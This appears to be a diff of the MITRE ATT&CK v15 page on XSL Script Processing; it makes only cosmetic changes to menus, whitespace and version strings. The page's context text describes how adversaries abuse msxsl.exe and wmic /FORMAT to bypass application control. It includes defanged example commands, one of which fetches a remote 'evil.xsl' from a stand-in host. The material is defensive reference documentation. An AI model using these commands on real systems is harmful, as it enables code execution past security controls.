@@ -135,6 +135,7 @@
     <div class="dropdown-menu " aria-labelledby="navbarDropdown">
                 <a class="dropdown-item" href="/versions/v15/resources/">Get Started</a>
                 <a class="dropdown-item" href="/versions/v15/resources/learn-more-about-attack/">Learn More about ATT&CK</a>
+                <a class="dropdown-item" href="/versions/v15/resources/attackcon/">ATT&CKcon</a>
                 <a class="dropdown-item" href="/versions/v15/resources/attack-data-and-tools/">ATT&CK Data & Tools</a>
                 <a class="dropdown-item" href="/versions/v15/resources/faq/">FAQ</a>
                 <a class="dropdown-item" href="/versions/v15/resources/engage-with-attack/contact/">Engage with ATT&CK</a>
@@ -204,11 +205,10 @@
                 <div class="container-fluid">
                     <h1 id="">
                         XSL Script Processing
-                    </h1> 
+                    </h1>
 
                         <div class="row">
                             <div class="col-md-8">
-   
 
                                     <div class="description-body">
                                                 <p>Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. <span onclick=scrollToRef('scite-1') id="scite-ref-1-a" class="scite-citeref-number" title="Wenzel, M. et al. (2017, March 30). XSLT Stylesheet Scripting Using <msxsl:script>. Retrieved July 3, 2018."data-reference="Microsoft XSLT Script Mar 2017"><sup><a href="https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script" target="_blank" data-hasqtip="0" aria-describedby="qtip-0">[1]</a></sup></span></p><p>Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to <a href="/versions/v15/techniques/T1127">Trusted Developer Utilities Proxy Execution</a>, the Microsoft common line transformation utility binary (msxsl.exe) <span onclick=scrollToRef('scite-2') id="scite-ref-2-a" class="scite-citeref-number" title="Microsoft. (n.d.). Command Line Transformation Utility (msxsl.exe). Retrieved July 3, 2018."data-reference="Microsoft msxsl.exe"><sup><a href="https://www.microsoft.com/download/details.aspx?id=21714" target="_blank" data-hasqtip="1" aria-describedby="qtip-1">[2]</a></sup></span> can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. <span onclick=scrollToRef('scite-3') id="scite-ref-3-a" class="scite-citeref-number" title="netbiosX. (2017, July 6). AppLocker Bypass – MSXSL. Retrieved July 3, 2018."data-reference="Penetration Testing Lab MSXSL July 2017"><sup><a href="https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/" target="_blank" data-hasqtip="2" aria-describedby="qtip-2">[3]</a></sup></span> Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. <span onclick=scrollToRef('scite-4') id="scite-ref-4-a" class="scite-citeref-number" title="Admin. (2018, March 2). Spear-phishing campaign leveraging on MSXSL. Retrieved July 3, 2018."data-reference="Reaqta MSXSL Spearphishing MAR 2018"><sup><a href="https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/" target="_blank" data-hasqtip="3" aria-describedby="qtip-3">[4]</a></sup></span> Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.<span onclick=scrollToRef('scite-5') id="scite-ref-5-a" class="scite-citeref-number" title="Singh, A. (2019, March 14). MSXSL.EXE and WMIC.EXE — A Way to Proxy Code Execution. Retrieved August 2, 2019."data-reference="XSL Bypass Mar 2019"><sup><a href="https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75" target="_blank" data-hasqtip="4" aria-describedby="qtip-4">[5]</a></sup></span></p><p>Command-line examples:<span onclick=scrollToRef('scite-3') id="scite-ref-3-a" class="scite-citeref-number" title="netbiosX. (2017, July 6). AppLocker Bypass – MSXSL. Retrieved July 3, 2018."data-reference="Penetration Testing Lab MSXSL July 2017"><sup><a href="https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/" target="_blank" data-hasqtip="2" aria-describedby="qtip-2">[3]</a></sup></span><span onclick=scrollToRef('scite-5') id="scite-ref-5-a" class="scite-citeref-number" title="Singh, A. (2019, March 14). MSXSL.EXE and WMIC.EXE — A Way to Proxy Code Execution. Retrieved August 2, 2019."data-reference="XSL Bypass Mar 2019"><sup><a href="https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75" target="_blank" data-hasqtip="4" aria-describedby="qtip-4">[5]</a></sup></span></p><ul><li><code>msxsl.exe customers[.]xml script[.]xsl</code></li><li><code>msxsl.exe script[.]xsl script[.]xsl</code></li><li><code>msxsl.exe script[.]jpeg script[.]jpeg</code></li></ul><p>Another variation of this technique, dubbed "Squiblytwo", involves using <a href="/versions/v15/techniques/T1047">Windows Management Instrumentation</a> to invoke JScript or VBScript within an XSL file.<span onclick=scrollToRef('scite-6') id="scite-ref-6-a" class="scite-citeref-number" title="LOLBAS. (n.d.). Wmic.exe. Retrieved July 31, 2019."data-reference="LOLBAS Wmic"><sup><a href="https://lolbas-project.github.io/lolbas/Binaries/Wmic/" target="_blank" data-hasqtip="5" aria-describedby="qtip-5">[6]</a></sup></span> This technique can also execute local/remote scripts and, similar to its <a href="/versions/v15/techniques/T1218/010">Regsvr32</a>/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in <a href="/versions/v15/techniques/T1047">Windows Management Instrumentation</a> provided they utilize the /FORMAT switch.<span onclick=scrollToRef('scite-5') id="scite-ref-5-a" class="scite-citeref-number" title="Singh, A. (2019, March 14). MSXSL.EXE and WMIC.EXE — A Way to Proxy Code Execution. Retrieved August 2, 2019."data-reference="XSL Bypass Mar 2019"><sup><a href="https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75" target="_blank" data-hasqtip="4" aria-describedby="qtip-4">[5]</a></sup></span></p><p>Command-line examples:<span onclick=scrollToRef('scite-5') id="scite-ref-5-a" class="scite-citeref-number" title="Singh, A. (2019, March 14). MSXSL.EXE and WMIC.EXE — A Way to Proxy Code Execution. Retrieved August 2, 2019."data-reference="XSL Bypass Mar 2019"><sup><a href="https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75" target="_blank" data-hasqtip="4" aria-describedby="qtip-4">[5]</a></sup></span><span onclick=scrollToRef('scite-6') id="scite-ref-6-a" class="scite-citeref-number" title="LOLBAS. (n.d.). Wmic.exe. Retrieved July 31, 2019."data-reference="LOLBAS Wmic"><sup><a href="https://lolbas-project.github.io/lolbas/Binaries/Wmic/" target="_blank" data-hasqtip="5" aria-describedby="qtip-5">[6]</a></sup></span></p><ul><li>Local File: <code>wmic process list /FORMAT:evil[.]xsl</code></li><li>Remote File: <code>wmic os get /FORMAT:"https[:]//example[.]com/evil[.]xsl"</code></li></ul>
@@ -374,7 +374,7 @@
                             <div class="tables-mobile">
                                 <table class="table table-bordered table-alternate mt-2">
                                     <thead>
-                                        <tr> 
+                                        <tr>
                                             <th scope="col">ID</th>
                                             <th scope="col">Mitigation</th>
                                             <th scope="col">Description</th>
@@ -444,7 +444,7 @@
 </table>
 </div>
 
-                
+
                             <h2 class="pt-3" id="references">References</h2>
 
         <div class="row">
@@ -592,7 +592,6 @@
         </div>
 
 
-    
                 </div>
             </div>
         </div>
@@ -653,7 +652,7 @@
                                         <u class="footer-link"><a href="/versions/v15/resources/legal-and-branding/privacy" class="footer-link">Privacy Policy</a></u>
                                     </div>
                                 <div class="px-3">
-                                    <u class="footer-link"><a href="/versions/v15/resources/changelog.html" class="footer-link" data-toggle="tooltip" data-placement="top" data-html="true" title="ATT&amp;CK content v15.1&#013;Website  v4.1.4">Website Changelog</a></u>
+                                    <u class="footer-link"><a href="/versions/v15/resources/changelog.html" class="footer-link" data-toggle="tooltip" data-placement="top" data-html="true" title="ATT&amp;CK content v15.1&#013;Website  v4.1.5">Website Changelog</a></u>
                                 </div>
                             </div>
                             <div class="row">
@@ -693,8 +692,8 @@
     <script src="/versions/v15/theme/scripts/popper.min.js"></script>
     <script src="/versions/v15/theme/scripts/bootstrap-select.min.js"></script>
     <script src="/versions/v15/theme/scripts/bootstrap.bundle.min.js"></script>
-    <script src="/versions/v15/theme/scripts/site.js?6540"></script>
-    <script src="/versions/v15/theme/scripts/settings.js?8184"></script>
+    <script src="/versions/v15/theme/scripts/site.js?695"></script>
+    <script src="/versions/v15/theme/scripts/settings.js?6863"></script>
     <script src="/versions/v15/theme/scripts/search_bundle.js"></script>
 
 <!--SCRIPTS-->
